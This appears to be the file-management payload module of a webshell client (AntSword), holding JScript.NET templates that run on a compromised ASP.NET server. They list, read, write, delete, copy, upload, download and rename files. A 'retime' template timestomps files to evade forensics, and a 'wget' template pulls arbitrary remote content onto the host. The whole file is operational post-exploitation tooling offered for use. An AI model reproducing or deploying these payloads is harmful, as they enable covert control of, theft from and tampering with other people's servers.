/**
 * 文件管理模板
 */

module.exports = (arg1, arg2, arg3) => ({
  dir: {
    _:
      `var D=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{return System.IO.File.GetLastWriteTime(p).ToString("yyyy-MM-dd HH:mm:ss");}for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+"/\\t"+T(P)+"\\t0\\t"+(s[i].Attributes)+"\\n");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+"\\t"+T(P)+"\\t"+s[i].Length+"\\t"+(s[i].Attributes)+"\\n");}`,
    [arg1]: "#{base64::path}"
  },

  delete: {
    _:
      `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));if(System.IO.Directory.Exists(P)){System.IO.Directory.Delete(P,true);}else{System.IO.File.Delete(P);}Response.Write("1");`,
    [arg1]: "#{base64::path}"
  },

  create_file: {
    _:
      `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var m=new System.IO.StreamWriter(P,false,Encoding.Default);m.Write(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])));m.Close();Response.Write("1");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::content}"
  },

  read_file: {
    _:
      `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var m=new System.IO.StreamReader(P,Encoding.Default);Response.Write(m.ReadToEnd());m.Close();`,
    [arg1]: "#{base64::path}"
  },

  copy: {
    _:
      `var S=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var D=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));function cp(S:String,D:String){if(System.IO.Directory.Exists(S)){var m=new System.IO.DirectoryInfo(S);var i;var f=m.GetFiles();var d=m.GetDirectories();System.IO.Directory.CreateDirectory(D);for (i in f)System.IO.File.Copy(S+"\\\\"+f[i].Name,D+"\\\\"+f[i].Name);for (i in d)cp(S+"\\\\"+d[i].Name,D+"\\\\"+d[i].Name);}else{System.IO.File.Copy(S,D);}}cp(S,D);Response.Write("1");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::target}"
  },

  download_file: {
    _:
      `Response.WriteFile(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));`,
    [arg1]: "#{base64::path}"
  },

  upload_file: {
    _:
      // `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var Z:String=Request.Item["${arg2}"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Create);fs.Write(B,0,B.Length);fs.Close();Response.Write("1");`,
      // 修改写入模式Create->Append
      `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var Z:String=Request.Item["${arg2}"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Write(B,0,B.Length);fs.Close();Response.Write("1");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{buffer::content}"
  },

  rename: {
    _:
      `var src=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])),dst=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));if (System.IO.Directory.Exists(src)){System.IO.Directory.Move(src,dst);}else{System.IO.File.Move(src,dst);}Response.Write("1");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::name}"
  },

  retime: {
    _:
      `var DD=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])),TM=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));if(System.IO.Directory.Exists(DD)){System.IO.Directory.SetCreationTime(DD,TM);System.IO.Directory.SetLastWriteTime(DD,TM);System.IO.Directory.SetLastAccessTime(DD,TM);}else{System.IO.File.SetCreationTime(DD,TM);System.IO.File.SetLastWriteTime(DD,TM);System.IO.File.SetLastAccessTime(DD,TM);}Response.Write("1");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::time}"
  },

  mkdir: {
    _:
      `var D=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));System.IO.Directory.CreateDirectory(D);Response.Write("1");`,
    [arg1]: "#{base64::path}"
  },

  wget: {
    _:
      `var X=new ActiveXObject("Microsoft.XMLHTTP");var S=new ActiveXObject("Adodb.Stream");S.Type=1;S.Mode=3;S.Open();X.Open("GET",System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])),false);X.Send();S.Write(X.ResponseBody);S.Position=0;S.SaveToFile(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),2);S.close;S=null;X=null;Response.Write("1");`,
    [arg1]: "#{base64::url}",
    [arg2]: "#{base64::path}"
  }
})
